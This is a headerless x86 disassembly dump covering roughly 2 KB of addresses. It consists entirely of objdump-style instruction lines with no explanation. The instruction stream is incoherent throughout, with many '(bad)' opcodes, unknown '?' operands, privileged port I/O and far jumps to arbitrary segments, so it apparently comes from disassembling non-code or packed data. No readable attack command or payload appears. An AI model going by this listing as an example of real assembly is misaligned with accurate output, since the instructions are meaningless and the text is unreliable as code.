  420326:	(bad)  
  420327:	xor    ebx,esi
  420329:	repnz jecxz 0x4202c3
  42032c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42032d:	and    DWORD PTR [edi],edx
  42032f:	int3   
  420330:	mov    ebx,0xba555871
  420335:	pop    es
  420336:	inc    edx
  420337:	in     eax,dx
  420338:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420339:	test   BYTE PTR [eax-0x67],dl
  42033c:	ror    DWORD PTR [ecx],0xfb
  42033f:	mov    DWORD PTR [esi-0x3a2e97f7],esp
  420345:	cmp    eax,0x3006d2a
  42034a:	retf   0x376a
  42034d:	jmp    0x420347
  42034f:	js     0x4203b4
  420351:	clc    
  420352:	das    
  420353:	fld    QWORD PTR [esi+0x2e]
  420356:	dec    esi
  420357:	cld    
  420358:	xchg   esp,eax
  420359:	les    ebx,FWORD PTR ds:0xc6730cea
  42035f:	push   edx
  420360:	stos   BYTE PTR es:[edi],al
  420361:	aaa    
  420362:	jmp    0xd758:0x2229adac
  420369:	and    al,BYTE PTR [edx+0x2d4923ad]
  42036f:	fisub  WORD PTR [ebp+0x6f56cb88]
  420375:	cmp    BYTE PTR [esi-0x69],ah
  420378:	dec    esi
  420379:	mov    bh,0x2b
  42037b:	sahf   
  42037c:	repnz sub eax,0x3f3283f3
  420382:	jmp    0x7bd0:0x7e85b86b
  420389:	mov    dh,0x10
  42038b:	xchg   esp,eax
  42038c:	in     eax,0x9d
  42038e:	hlt    
  42038f:	retf   
  420390:	imul   ebp,ebp,0x72
  420393:	xchg   ecx,eax
  420394:	mov    bh,ah
  420396:	and    eax,0x37fb4d79
  42039b:	cmp    DWORD PTR [esi+ecx*4+0x2f],esi
  42039f:	xor    eax,0xd6d37b3a
  4203a4:	repz pop eax
  4203a6:	mov    cl,0xe
  4203a8:	mov    bl,0x5a
  4203aa:	mov    dl,0x71
  4203ac:	nop
  4203ad:	fdiv   DWORD PTR [ecx+0x1b]
  4203b0:	mov    eax,ds:0x37763c3
  4203b5:	enter  0x5e25,0x91
  4203b9:	(bad)  
  4203ba:	addr16 push si
  4203bd:	in     eax,dx
  4203be:	pop    es
  4203bf:	jae    0x4203b4
  4203c1:	sbb    DWORD PTR [edi],esi
  4203c3:	jne    0x4203b9
  4203c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4203c6:	adc    DWORD PTR [ebx-0x61],ebx
  4203c9:	imul   esp
  4203cb:	and    ebx,ebp
  4203cd:	xchg   esi,eax
  4203ce:	imul   ebx,edi,0xffffffef
  4203d1:	jno    0x4203fb
  4203d3:	test   BYTE PTR [eax+0x1d],cl
  4203d6:	pop    edi
  4203d7:	add    al,0xdf
  4203d9:	sub    DWORD PTR [edx-0x46],ecx
  4203dc:	mov    WORD PTR [eax-0x1f],?
  4203df:	(bad)  
  4203e0:	nop
  4203e1:	stos   BYTE PTR es:[edi],al
  4203e2:	add    edx,DWORD PTR [esi+0x47299175]
  4203e8:	clc    
  4203e9:	fwait
  4203ea:	and    DWORD PTR [edi+0x457b2698],ebx
  4203f0:	inc    DWORD PTR [eax-0x49]
  4203f3:	ret    
  4203f4:	add    eax,0x5af54c13
  4203f9:	pop    ebp
  4203fa:	push   cs
  4203fb:	mov    ah,0x18
  4203fd:	mov    dl,0x50
  4203ff:	push   eax
  420400:	and    BYTE PTR [edi-0xe],al
  420403:	mov    DWORD PTR [esi],ecx
  420405:	adc    BYTE PTR [ecx-0x9f5de8a],bh
  42040b:	inc    ebx
  42040c:	sbb    BYTE PTR ds:0x344f7c46,cl
  420412:	add    BYTE PTR [ecx],ah
  420414:	sti    
  420415:	push   DWORD PTR [ebx+0x5d]
  420418:	jne    0x4203b8
  42041a:	cmp    al,0xd1
  42041c:	sbb    BYTE PTR [eax+0x75a3f36a],dl
  420422:	jge    0x420433
  420424:	jne    0x4203ae
  420426:	scas   eax,DWORD PTR es:[edi]
  420427:	push   ds
  420428:	and    DWORD PTR [ebx],edx
  42042a:	push   esi
  42042b:	add    DWORD PTR [esi+0x6fcf86a5],0x49a21f82
  420435:	loopne 0x420426
  420437:	jbe    0x42047c
  420439:	cmp    edx,DWORD PTR [ebx+0x4c3eb46]
  42043f:	jmp    0xa3a7c3c0
  420444:	xchg   ebx,eax
  420445:	outs   dx,BYTE PTR ds:[esi]
  420446:	cld    
  420447:	and    eax,0x1b69facd
  42044c:	jmp    0x8a88596b
  420451:	(bad)  
  420452:	mov    ecx,0xba2ba2b1
  420457:	sbb    DWORD PTR [ebx],edi
  420459:	adc    ecx,DWORD PTR [ebp+ebp*1-0x2e]
  42045d:	retf   0xe745
  420460:	adc    edx,DWORD PTR [edx]
  420462:	addr16 cli 
  420464:	aad    0x54
  420466:	mov    esp,0x75a676ac
  42046b:	aad    0x97
  42046d:	jl     0x42041c
  42046f:	icebp  
  420470:	stc    
  420471:	pop    edi
  420472:	sub    bh,BYTE PTR [ebx-0x4f]
  420475:	xchg   ebp,eax
  420476:	xchg   BYTE PTR [ecx+eiz*4+0x40],al
  42047a:	gs jmp 0x41c3b976
  420480:	fdivr  DWORD PTR [esi-0x752a133a]
  420486:	(bad)  
  420487:	stc    
  420488:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420489:	jae    0x42042c
  42048b:	int3   
  42048c:	and    ah,BYTE PTR [esi]
  42048e:	ins    BYTE PTR es:[edi],dx
  42048f:	arpl   WORD PTR [esi-0x5562891c],bx
  420495:	add    dl,BYTE PTR [edx]
  420497:	push   eax
  420498:	inc    ebx
  420499:	rcr    BYTE PTR [eax],1
  42049b:	dec    esi
  42049c:	out    0xcc,al
  42049e:	dec    eax
  42049f:	add    al,0xa1
  4204a1:	sbb    BYTE PTR [esi],cl
  4204a3:	push   esi
  4204a5:	fbstp  TBYTE PTR [edi+0x46]
  4204a8:	xor    al,bl
  4204aa:	and    al,0x5e
  4204ac:	push   0xde480e78
  4204b1:	xchg   BYTE PTR ds:0xf9bbad6e,bh
  4204b7:	test   DWORD PTR [edx-0x39],ebp
  4204ba:	xchg   edi,eax
  4204bb:	pop    ecx
  4204bc:	jnp    0x42047b
  4204be:	adc    BYTE PTR [ebx-0x3c],ch
  4204c1:	les    esi,FWORD PTR [esi]
  4204c3:	add    eax,0xe00267db
  4204c8:	xlat   BYTE PTR ds:[ebx]
  4204c9:	test   esp,ebx
  4204cb:	mov    DWORD PTR [esi-0x67],esi
  4204ce:	loop   0x4204bb
  4204d0:	in     eax,dx
  4204d1:	fs jecxz 0x42050c
  4204d4:	fwait
  4204d5:	pop    esp
  4204d6:	or     edi,DWORD PTR [eax]
  4204d8:	cmp    bl,cl
  4204da:	dec    ebx
  4204db:	jmp    0xf73e:0x70eeffe6
  4204e2:	shl    BYTE PTR [esi],0x9
  4204e5:	pop    es
  4204e6:	inc    ebp
  4204e7:	jne    0x4204d0
  4204e9:	dec    edi
  4204ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4204eb:	cmc    
  4204ec:	rol    dh,0x3f
  4204ef:	ret    
  4204f0:	jmp    0x9f33:0x707a6641
  4204f7:	sti    
  4204f8:	jp     0x420487
  4204fa:	addr16 pop edi
  4204fd:	test   ecx,ecx
  4204ff:	sub    cl,BYTE PTR [ecx+0x29]
  420502:	loopne 0x42056f
  420504:	out    0xcd,eax
  420506:	iret   
  420507:	add    esi,DWORD PTR ds:0x6ed4c7d5
  42050d:	inc    esp
  42050e:	jmp    0x42050c
  420510:	xchg   ecx,eax
  420511:	dec    edi
  420512:	inc    ecx
  420513:	sar    ebx,cl
  420515:	sub    eax,0xfb700c12
  42051a:	out    dx,al
  42051b:	push   esi
  42051c:	ficomp DWORD PTR [esi]
  42051e:	and    ecx,ebx
  420520:	pop    eax
  420521:	fisub  WORD PTR [esi+0x58fcc935]
  420527:	int    0x9d
  420529:	in     eax,0x52
  42052b:	sub    dh,BYTE PTR [ebp+0x346958e8]
  420531:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420532:	or     ch,dl
  420534:	push   edx
  420535:	jo     0x420504
  420537:	out    0x87,al
  420539:	div    DWORD PTR [esi+eax*2-0x1d]
  42053d:	mov    BYTE PTR [ebx-0x55],0x6c
  420541:	adc    ebx,0xc07c407e
  420547:	clc    
  420548:	mov    eax,ds:0x5c21fd8c
  42054d:	jge    0x42058b
  42054f:	js     0x420567
  420551:	cmp    al,0xc0
  420553:	pop    ebx
  420554:	jecxz  0x4205cd
  420556:	jge    0x4205c1
  420558:	mov    eax,0x485c057e
  42055d:	sub    BYTE PTR [eax],dl
  42055f:	or     edx,ecx
  420561:	daa    
  420562:	aad    0x28
  420564:	sub    eax,0x5c5b4421
  420569:	shl    edx,1
  42056b:	mov    al,0xdd
  42056d:	mov    cl,0x40
  42056f:	push   0xffffffe3
  420571:	adc    edi,ecx
  420573:	mov    DWORD PTR [esi-0x3c],edi
  420576:	pop    ss
  420577:	in     eax,dx
  420578:	pop    esp
  420579:	aad    0x80
  42057b:	ret    
  42057c:	xor    eax,0xdcc1aa0
  420581:	pop    edi
  420582:	aas    
  420583:	adc    eax,0x6b8acd42
  420588:	daa    
  420589:	aam    0x6a
  42058b:	ror    bh,1
  42058d:	xor    ch,ah
  42058f:	xor    DWORD PTR [esp+0x48],edi
  420593:	je     0x4205a3
  420595:	xchg   ecx,eax
  420596:	ins    DWORD PTR es:[edi],dx
  420597:	retf   
  420598:	pop    ds
  420599:	stos   BYTE PTR es:[edi],al
  42059a:	mov    ebp,0xdadf964b
  42059f:	xor    al,dl
  4205a1:	jb     0x420611
  4205a3:	adc    ebx,DWORD PTR [edx]
  4205a5:	out    dx,eax
  4205a6:	daa    
  4205a7:	cwde   
  4205a8:	(bad)  
  4205a9:	into   
  4205aa:	mov    ebp,esi
  4205ac:	pop    edi
  4205ad:	mov    edx,0xff59fbec
  4205b2:	xor    esp,eax
  4205b4:	inc    bx
  4205b6:	mov    eax,ds:0x9fe5c1d4
  4205bb:	inc    esp
  4205bc:	data16 add al,0xa9
  4205bf:	fucomi st,st(0)
  4205c1:	int3   
  4205c2:	mov    ch,0x4e
  4205c4:	jg     0x420550
  4205c6:	adc    BYTE PTR [eax],bl
  4205c8:	test   ah,ah
  4205ca:	xor    bh,BYTE PTR [edx+0x23]
  4205cd:	mov    WORD PTR [esi+eiz*8+0x62a820d5],ds
  4205d4:	inc    eax
  4205d5:	pop    ds
  4205d6:	push   DWORD PTR [edi-0x18]
  4205d9:	push   edx
  4205da:	push   0x36
  4205dc:	sub    ebp,DWORD PTR [eax]
  4205de:	push   eax
  4205df:	add    BYTE PTR [eax+0xb06d406],0x78
  4205e6:	ins    DWORD PTR es:[edi],dx
  4205e7:	mov    ebx,0x5fefa61
  4205ec:	test   BYTE PTR [ecx],al
  4205ee:	cmp    BYTE PTR [ecx],dl
  4205f0:	or     al,0xdf
  4205f2:	mov    esp,0xdd4768ec
  4205f7:	das    
  4205f8:	inc    edx
  4205f9:	aad    0x3c
  4205fb:	jno    0x420613
  4205fd:	or     DWORD PTR [esi],ecx
  4205ff:	xchg   ecx,eax
  420600:	outs   dx,DWORD PTR ds:[esi]
  420601:	inc    edx
  420602:	rep lods al,BYTE PTR ds:[esi]
  420604:	in     al,0x7c
  420606:	stc    
  420607:	cmp    eax,0x8a58a64f
  42060c:	dec    edx
  42060d:	jo     0x4205af
  42060f:	imul   edi,DWORD PTR [ebx+0x1e73f8a3],0xffffffd3
  420616:	sar    BYTE PTR [eax+edi*2],cl
  420619:	aam    0x1d
  42061b:	ret    
  42061c:	inc    edx
  42061d:	xor    eax,0xe37a9d27
  420622:	xchg   esi,eax
  420623:	xchg   esi,eax
  420624:	mov    ds:0x6581c9d3,eax
  420629:	mov    eax,0x7ed743b4
  42062e:	and    al,0x50
  420630:	and    al,ch
  420632:	mov    cl,0x9b
  420634:	nop
  420635:	das    
  420636:	adc    bh,BYTE PTR [ebp+0x373d278]
  42063c:	fadd   QWORD PTR [ebx-0x62899a37]
  420642:	int3   
  420643:	(bad)  
  420645:	pop    esi
  420646:	xor    ecx,esi
  420648:	iret   
  420649:	and    esp,ebx
  42064b:	mov    al,0x1a
  42064d:	dec    esi
  42064e:	pop    edi
  42064f:	inc    ecx
  420650:	inc    edi
  420651:	lahf   
  420652:	xchg   esi,eax
  420653:	popa   
  420654:	mov    ds:0xdff98fd4,eax
  420659:	cmp    ah,bh
  42065b:	or     esi,DWORD PTR [ecx]
  42065d:	in     eax,0x51
  42065f:	mov    al,ds:0x206a5bbf
  420664:	jecxz  0x420600
  420666:	inc    ebp
  420668:	dec    edx
  420669:	shr    DWORD PTR [ebx+0x78fcfdf0],1
  42066f:	add    dh,ah
  420671:	(bad)  
  420672:	mov    eax,ds:0x4dec93cd
  420677:	dec    ebp
  420678:	jecxz  0x420612
  42067a:	xor    al,0x44
  42067c:	fwait
  42067d:	aam    0xb2
  42067f:	in     al,0x16
  420681:	xchg   BYTE PTR [ebx],dl
  420683:	call   0x4f4637ed
  420688:	inc    edi
  420689:	mov    edi,0x28e029a9
  42068e:	mov    esp,0x8b75f900
  420693:	lods   al,BYTE PTR ds:[esi]
  420694:	test   BYTE PTR [ebx-0x52ee5ca0],0xe1
  42069b:	outs   dx,BYTE PTR ds:[esi]
  42069c:	stos   BYTE PTR es:[edi],al
  42069d:	push   ebx
  42069e:	pop    edi
  42069f:	cmp    bh,BYTE PTR [eax-0x56fb28f3]
  4206a5:	lods   eax,DWORD PTR ds:[esi]
  4206a6:	loopne 0x420659
  4206a8:	test   eax,0x807dfc71
  4206ad:	cmp    eax,0x5828514b
  4206b2:	daa    
  4206b3:	cli    
  4206b4:	lods   al,BYTE PTR ds:[esi]
  4206b5:	es nop
  4206b7:	sbb    edx,DWORD PTR [eax]
  4206b9:	test   DWORD PTR [edx-0x40bea2],0x3364ea1e
  4206c3:	fcom   QWORD PTR [edx+0x4a]
  4206c6:	xor    DWORD PTR [edx+0x5f3188d1],ebx
  4206cc:	sub    eax,0x9877236
  4206d1:	stc    
  4206d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4206d3:	xor    eax,0x8945a475
  4206d8:	popf   
  4206d9:	shl    esp,0x5c
  4206dc:	cld    
  4206dd:	adc    eax,0x634f7167
  4206e2:	sar    DWORD PTR [esi+esi*2-0x5a2b0522],1
  4206e9:	cmp    eax,ebp
  4206eb:	add    ebx,ebp
  4206ed:	ret    
  4206ee:	and    DWORD PTR [ebx],0x6778b187
  4206f4:	pop    DWORD PTR [eax-0x5d0aae1b]
  4206fa:	mov    ds:0x61f945d1,eax
  4206ff:	dec    esi
  420700:	jp     0x4206eb
  420702:	adc    eax,0x2fd381be
  420707:	dec    ebx
  420708:	jb     0x420770
  42070a:	pop    esi
  42070b:	add    eax,0x2d286710
  420710:	(bad)  [ebx-0x6f8c0c6d]
  420716:	imul   edx,edx,0x49
  420719:	and    al,0x73
  42071b:	jb     0x4206a8
  42071d:	xchg   edi,eax
  42071e:	xchg   DWORD PTR [edx-0x5e],esp
  420721:	arpl   WORD PTR [esi+0x4f],bp
  420724:	cli    
  420725:	hlt    
  420726:	sahf   
  420727:	adc    BYTE PTR [ebx-0x227ce46d],ch
  42072d:	or     al,0x6
  42072f:	loope  0x4206bb
  420731:	xchg   esp,eax
  420732:	into   
  420733:	pop    ds
  420734:	ret    0x2750
  420737:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420738:	and    ah,dl
  42073a:	jmp    0x420748
  42073c:	sub    DWORD PTR [ebp+0x6],edx
  42073f:	cmp    esi,DWORD PTR [edi+0x68380ef8]
  420745:	xor    dl,al
  420747:	into   
  420748:	aaa    
  420749:	push   edi
  42074a:	das    
  42074b:	jnp    0x420798
  42074d:	daa    
  42074e:	fisub  DWORD PTR [esi+0xf]
  420751:	jnp    0x420719
  420753:	(bad)  
  420754:	push   esi
  420755:	sub    dl,ch
  420757:	and    BYTE PTR [ebx+0x17],0xe2
  42075b:	scas   eax,DWORD PTR es:[edi]
  42075c:	fldenv [ebx+0x5e2c69a6]
  420762:	mov    esi,?
  420764:	aam    0xa
  420766:	add    eax,0x1a8b3609
  42076b:	sub    DWORD PTR [edi-0x660e7ede],ecx
  420771:	mov    al,0x67
  420773:	loop   0x42079d
  420775:	push   0x63f2c304
  42077a:	int    0x25
  42077c:	cmc    
  42077d:	ret    
  42077e:	(bad)  
  42077f:	shl    BYTE PTR [edi+edx*4-0x766a6735],1
  420786:	xchg   esi,eax
  420787:	in     eax,dx
  420788:	pop    ecx
  420789:	into   
  42078a:	mov    edi,0x6f913e90
  42078f:	inc    ecx
  420790:	sbb    BYTE PTR [edx+0x56],ch
  420793:	cwde   
  420794:	add    BYTE PTR [edi],dh
  420796:	jmp    0x2cf85062
  42079b:	add    ch,ah
  42079d:	mov    ah,0x36
  42079f:	mov    eax,ds:0xb6f1ce29
  4207a4:	push   ds
  4207a5:	inc    esp
  4207a6:	cdq    
  4207a7:	push   cs
  4207a8:	inc    edi
  4207a9:	mov    eax,cs
  4207ab:	cmc    
  4207ac:	fidiv  DWORD PTR [eax]
  4207ae:	adc    di,si
  4207b1:	dec    esp
  4207b2:	or     esi,DWORD PTR [esp+eax*8+0x65]
  4207b6:	dec    eax
  4207b7:	out    dx,al
  4207b8:	fmul   QWORD PTR [esi]
  4207ba:	mov    dh,0xa7
  4207bc:	and    bl,0x84
  4207bf:	xor    eax,0xe40b4a8a
  4207c4:	arpl   WORD PTR [ebp-0x65],si
  4207c7:	loopne 0x420754
  4207c9:	adc    BYTE PTR [esi+0x691fdef0],al
  4207cf:	sbb    eax,0xf9686fd1
  4207d4:	sub    bh,bl
  4207d6:	and    DWORD PTR [ebx+esi*4-0x3b],esi
  4207da:	push   esi
  4207db:	dec    ecx
  4207dc:	inc    ecx
  4207dd:	push   ecx
  4207de:	mov    eax,0x8a0a3c97
  4207e3:	cmp    ch,BYTE PTR [eax-0xa7a5dc3]
  4207e9:	fs mov edi,0x54591c07
  4207ef:	in     eax,dx
  4207f0:	or     dl,bh
  4207f2:	push   ds
  4207f3:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  4207f5:	cs or  eax,eax
  4207f8:	xor    DWORD PTR [eax-0x871964a],ecx
  4207fe:	jno    0x4207a0
  420800:	out    dx,al
  420801:	xor    DWORD PTR [esi],ecx
  420803:	fsubr  st,st(4)
  420805:	and    eax,0x219a6c8
  42080a:	imul   ebp,DWORD PTR [ecx-0x2a],0x60
  42080e:	(bad)  
  42080f:	inc    ecx
  420810:	in     eax,0x7a
  420812:	or     eax,0x443cd269
  420817:	call   0x1f1e549f
  42081c:	mov    esi,0xfeb132e1
  420821:	rol    dh,0x4b
  420824:	dec    esp
  420825:	popa   
  420826:	mov    dl,0x7c
  420828:	(bad)  
  42082a:	mov    esi,DWORD PTR [edx]
  42082c:	fld    st(4)
  42082e:	lahf   
  42082f:	mul    bl
  420831:	sub    BYTE PTR [edx+0x18d656ce],dl
  420837:	cmp    cl,cl
  420839:	jp     0x4208b2
  42083b:	inc    edi
  42083c:	xor    edi,DWORD PTR [esi+0x5d2441de]
  420842:	cli    
  420843:	mov    ?,ebx
  420845:	push   esi
  420846:	jge    0x420885
  420848:	fist   DWORD PTR [edi-0x2b7cef3e]
  42084e:	inc    ebx
  42084f:	xchg   BYTE PTR [ecx-0x76],ah
  420852:	cli    
  420853:	fsubr  DWORD PTR [edx]
  420855:	and    al,0xcc
  420857:	call   0xc29c:0xad5cdd09
  42085e:	mov    BYTE PTR [esi+0x7acd6fbb],dl
  420864:	into   
  420865:	std    
  420866:	jns    0x420895
  420868:	or     edi,DWORD PTR [ebp+0x2010f853]
  42086e:	inc    ebp
  42086f:	imul   ebp,DWORD PTR [edx],0xffffff8d
  420872:	dec    edx
  420873:	cli    
  420874:	xlat   BYTE PTR ds:[ebx]
  420875:	pop    eax
  420876:	mov    bl,0x53
  420878:	into   
  420879:	mov    esi,0x98d90e2b
  42087e:	arpl   WORD PTR [eax+eiz*8-0x3d],cx
  420882:	push   ebx
  420883:	dec    esi
  420884:	pop    ss
  420885:	in     al,dx
  420886:	shl    edx,1
  420888:	xor    eax,DWORD PTR [ebx+0x65]
  42088b:	ficom  DWORD PTR [ecx-0x28f35a8b]
  420891:	ss push ecx
  420893:	daa    
  420894:	mov    ds:0xee891fe,al
  420899:	das    
  42089a:	nop
  42089b:	xor    DWORD PTR [ebp+0x28cef079],0x3dce5a54
  4208a5:	add    eax,DWORD PTR [ebp+0x53]
  4208a8:	cld    
  4208a9:	fild   QWORD PTR [esi]
  4208ab:	mov    ds:0x608f1f0a,eax
  4208b0:	shl    DWORD PTR [edx+ecx*8],0xae
  4208b4:	sub    BYTE PTR [edi],ah
  4208b6:	out    0xd3,al
  4208b8:	cmp    ecx,DWORD PTR [ecx]
  4208ba:	mov    bh,0x41
  4208bc:	inc    ecx
  4208bd:	test   BYTE PTR [eax],cl
  4208bf:	pop    edi
  4208c0:	les    ebx,FWORD PTR [ebx+0x61c220dd]
  4208c6:	and    DWORD PTR [esi-0x56],edx
  4208c9:	sub    eax,0x461469c0
  4208ce:	add    ebx,eax
  4208d0:	inc    ebx
  4208d1:	stc    
  4208d2:	fucomip st,st(1)
  4208d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4208d5:	outs   dx,DWORD PTR ds:[esi]
  4208d6:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  4208d8:	push   ebp
  4208d9:	xlat   BYTE PTR ds:[ebx]
  4208da:	data16 mov ah,0xeb
  4208dd:	mul    BYTE PTR ds:0xd559f265
  4208e3:	fbld   TBYTE PTR [edx-0x75]
  4208e6:	push   ebx
  4208e7:	sar    DWORD PTR [esi-0x7b3aa053],1
  4208ed:	xor    al,BYTE PTR [ebp-0x1a]
  4208f0:	test   DWORD PTR [ecx+edx*4+0x65],ebp
  4208f4:	push   ds
  4208f5:	repnz add bl,BYTE PTR [edi]
  4208f8:	push   cs
  4208f9:	pop    edi
  4208fa:	aad    0x7d
  4208fc:	mov    bl,0x69
  4208fe:	stos   BYTE PTR es:[edi],al
  4208ff:	je     0x420954
  420901:	repnz dec esp
  420903:	xchg   edx,eax
  420904:	mov    ecx,0xea93f3c
  420909:	icebp  
  42090a:	dec    edx
  42090b:	int3   
  42090c:	daa    
  42090d:	push   ss
  42090e:	or     al,0x6a
  420910:	pop    es
  420911:	jp     0x42089d
  420913:	add    BYTE PTR [edi-0x42cf0dce],0x61
  42091a:	lds    eax,FWORD PTR [ebp-0x5147d750]
  420920:	ins    BYTE PTR es:[edi],dx
  420921:	sbb    edx,DWORD PTR [esi]
  420923:	(bad)  
  420924:	jg     0x4208f3
  420926:	dec    esi
  420927:	ins    DWORD PTR es:[edi],dx
  420928:	mov    bh,0x76
  42092a:	push   edi
  42092b:	in     al,dx
  42092c:	adc    esp,DWORD PTR [eax+0x69a3a50b]
  420932:	loop   0x42097e
  420934:	out    dx,al
  420935:	and    al,0xa2
  420937:	inc    esp
  420938:	mov    bh,0xe0
  42093a:	jno    0x42094b
  42093c:	repnz xor BYTE PTR [edi+0x40dff20b],bh
  420943:	jecxz  0x4208e7
  420945:	es (bad) 
  420948:	rcl    DWORD PTR [bx+di-0x1f],0x83
  42094d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42094e:	(bad)
  420952:	or     BYTE PTR [esp+ecx*2+0x777e46c5],cl
  420959:	sbb    al,0xbd
  42095b:	popa   
  42095c:	fbstp  TBYTE PTR [ebp+0x6193f3ec]
  420962:	mov    ds:0x4e75c65e,al
  420967:	sub    al,0x3d
  420969:	pop    esp
  42096a:	mov    al,0x48
  42096c:	xor    al,0x50
  42096e:	mov    WORD PTR [eax],es
  420970:	adc    esi,DWORD PTR [edx+0x7019cfb5]
  420976:	jecxz  0x4209ea
  420978:	lahf   
  420979:	mov    ebp,0x1096ded
  42097e:	sbb    ch,BYTE PTR [ecx]
  420980:	test   al,0x3d
  420982:	dec    esp
  420983:	sub    al,0x95
  420985:	or     eax,0xf6d730d5
  42098a:	push   ss
  42098b:	mov    fs,ebx
  42098d:	sbb    ecx,DWORD PTR [ecx+0x7ad1f753]
  420993:	sbb    DWORD PTR [esi-0x66819a64],edx
  420999:	int3   
  42099a:	jbe    0x42094c
  42099c:	das    
  42099d:	push   edx
  42099e:	stc    
  42099f:	inc    eax
  4209a0:	cmp    ecx,eax
  4209a2:	je     0x420969
  4209a4:	and    ch,BYTE PTR [edi+0x7f7ae0d3]
  4209aa:	add    eax,0x2cf9b598
  4209af:	or     DWORD PTR [eax+edx*2-0x29],ebp
  4209b3:	inc    edx
  4209b4:	mov    dh,0x37
  4209b6:	pop    ds
  4209b7:	adc    al,0xc9
  4209b9:	retf   0x8b5f
  4209bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4209bd:	pop    esp
  4209be:	dec    esi
  4209bf:	popa   
  4209c0:	ret    
  4209c1:	push   esp
  4209c2:	push   es
  4209c3:	dec    edx
  4209c4:	push   ebx
  4209c5:	or     al,0x8
  4209c7:	xor    dl,dh
  4209c9:	lahf   
  4209ca:	add    esi,esi
  4209cc:	mov    ?,WORD PTR [ebp*8-0x169e66a9]
  4209d3:	(bad)  
  4209d4:	adc    edi,DWORD PTR [ecx+0x33]
  4209d7:	mov    ?,WORD PTR [ebx+0x30c64fe8]
  4209dd:	inc    edx
  4209de:	pusha  
  4209df:	jl     0x420a43
  4209e1:	ins    BYTE PTR es:[edi],dx
  4209e2:	lods   eax,DWORD PTR ds:[esi]
  4209e3:	inc    ebx
  4209e4:	cmp    BYTE PTR [ebp+0x2b],cl
  4209e7:	daa    
  4209e8:	dec    edi
  4209e9:	je     0x4209bb
  4209eb:	push   esi
  4209ec:	daa    
  4209ed:	xor    eax,0xd2eef414
  4209f2:	sub    DWORD PTR [ebp-0x15c7425b],0x6684b03f
  4209fc:	dec    ecx
  4209fd:	sub    ebx,esp
  4209ff:	aam    0xca
  420a01:	int3   
  420a02:	js     0x420a35
  420a04:	cld    
  420a05:	sbb    BYTE PTR [ecx],bh
  420a07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a08:	sub    eax,0x5e95aaf5
  420a0d:	loopne 0x420a82
  420a0f:	push   ss
  420a10:	sub    eax,DWORD PTR [edx+0x72]
  420a13:	and    eax,0xc0dd4d5c
  420a18:	(bad)  
  420a19:	ficom  DWORD PTR ds:0xaad81736
  420a1f:	(bad)  
  420a20:	js     0x420aa0
  420a22:	cmp    ecx,DWORD PTR [ebp+0x39a3c51d]
  420a28:	cdq    
  420a29:	ret    
  420a2a:	ins    BYTE PTR es:[edi],dx
  420a2b:	and    esi,esi
  420a2d:	cli    
  420a2e:	xchg   BYTE PTR [ecx+eiz*8+0x4a],ah
  420a32:	sti    
  420a33:	shl    DWORD PTR ds:0x584f249b,1
  420a39:	in     al,dx
  420a3a:	jmp    0x4209f9
  420a3c:	jmp    0x5a7e:0x96554a34
  420a43:	cli    
  420a44:	jge    0x420a31
  420a46:	fimul  DWORD PTR [esi-0x7e]
  420a49:	mov    ebp,0x4dc06bc7
  420a4e:	psubq  mm4,mm4
  420a51:	stos   DWORD PTR es:[edi],eax
  420a52:	mov    edi,0x1b7fcb4f
  420a57:	sub    eax,DWORD PTR [esi+0x3fca0df4]
  420a5d:	xor    edx,DWORD PTR [esi-0x332bd2d5]
  420a63:	inc    esi
  420a64:	push   esi
  420a65:	jae    0x4209eb
  420a67:	jg     0x420a29
  420a69:	or     ecx,eax
  420a6b:	and    cl,dl
  420a6d:	(bad)  [esi-0x78fa82ca]
  420a73:	stos   BYTE PTR es:[edi],al
  420a74:	xchg   edx,eax
  420a75:	nop
  420a76:	jb     0x420ae2
  420a78:	jo     0x420a3c
  420a7a:	repnz mov edx,0xfd77cd46
  420a80:	les    edi,FWORD PTR ds:0x50beef97
  420a86:	fs retf 
  420a88:	push   edx
  420a89:	out    dx,al
  420a8a:	sbb    DWORD PTR [edx],edi
  420a8c:	js     0x420a34
  420a8e:	fsubr  DWORD PTR ds:0x55d6bfc5
  420a94:	cld    
  420a95:	or     BYTE PTR [ebx],ch
  420a97:	jb     0x420a2a
  420a99:	bound  edi,QWORD PTR [ebp+ebp*8+0x20]
  420a9d:	xchg   esp,eax
  420a9e:	jb     0x420a65
  420aa0:	lea    ecx,[edx-0x503dda64]
  420aa6:	xor    ah,BYTE PTR [ecx-0x58]
  420aa9:	mov    eax,0xd10ce3bb
  420aae:	xchg   ebx,eax
  420aaf:	dec    edi
  420ab0:	fwait
  420ab1:	dec    ebp
  420ab2:	iret   
  420ab3:	adc    eax,DWORD PTR [esi]
  420ab5:	and    eax,ebx
  420ab7:	mov    dl,0x89
  420ab9:	scas   eax,DWORD PTR es:[edi]
  420aba:	mov    bh,0xc
  420abc:	dec    ebx
  420abd:	xor    BYTE PTR [esi+0xbfc4089],ah
  420ac3:	ret    0x6c7
  420ac6:	add    edx,ebp
  420ac8:	test   esp,edx
  420aca:	out    0x97,al
  420acc:	pop    ecx
  420acd:	test   DWORD PTR [esi+eax*1+0x8],ebp
  420ad1:	pusha  
  420ad2:	mov    dl,0x0
  420ad4:	out    dx,al
  420ad5:	fsub   st,st(1)
  420ad7:	dec    ecx
  420ad8:	aas    
  420ad9:	shl    BYTE PTR [esi+0x5c],1
  420adc:	(bad)  
  420add:	jg     0x420afe
  420adf:	stos   DWORD PTR es:[edi],eax
  420ae0:	pop    ecx
  420ae1:	xor    eax,0x72cb3489
  420ae6:	mov    ebx,0x4d9cdaf0
  420aeb:	push   es
  420aec:	nop
  420aed:	lea    edx,[ecx]
  420aef:	xchg   edi,eax
  420af0:	cmp    eax,0x9f94c4bd
  420af5:	lods   al,BYTE PTR ds:[esi]
  420af6:	mov    eax,0x4cf48666
